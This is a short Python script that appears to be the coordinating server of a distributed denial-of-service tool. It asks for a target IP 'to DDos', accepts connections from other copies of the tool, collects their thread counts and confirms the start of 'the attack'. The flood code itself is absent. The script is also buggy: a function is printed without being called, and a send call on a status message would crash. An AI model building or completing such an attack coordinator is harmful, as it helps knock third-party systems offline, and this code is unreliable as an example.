import socket
import requests
import time
import ipaddress
import json

def logit(addr,threadCount,messg):
    with open("output/log.txt",'+a') as f :
        content = f"[{time.ctime()}] :: connection from {addr} with {threadCount} threads :: {messg}"
        f.write(content)
        
def get_publicIp():
    endpoint = 'https://ipinfo.io/json'
    response = requests.get(endpoint, verify = True)
    if response.status_code != 200:
        return 'Status:', response.status_code, 'Problem with the request. Exiting.'
        exit()
    data = response.json()
    return data['ip']

def start_party():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    port = int(input("Enter the port no to host a Server : "))
    Target = input("Enter the Ip to DDos : ")

    try :
        ipaddress.ip_address(Target)
    except ValueError:
        print("Invalid ip !!!")
        exit()
        
    s.bind(('',port))
    s.listen(30)     
    print (f"socket is listening at {get_publicIp}")         
    print("connect the server using the same tool and commands will be Given there !!!")


    while True:
        c,addr   = s.accept()
        print(f"Got connection form {addr}!!")
        c.send("Enter the Thread Count For the attack 5-30 [default=10]: ".encode())
        try:
            thread = int(c.recv(1024).decode())
            logit(addr=addr,threadCount=thread,messg="Connected")
            c.send("The attack will be Started Press [ S ] to Continue  : ".encode())
            confo = c.recv(1024).decode()
            if(confo == 's' or confo == 'S'):
                c.send("Started").encode()
                logit(addr=addr,threadCount=thread,messg="Started")
            else:
                c.send("ITs Not Starting ....".encode())
                c.send("Exiting......!".encode())
                logit(addr=addr,threadCount=thread,messg="Exited")
                s.close()
        except ValueError:
            print("Value Error !!")
            s.close()
        except KeyboardInterrupt:
            s.close()
            print("Breaking .....!")
            break
        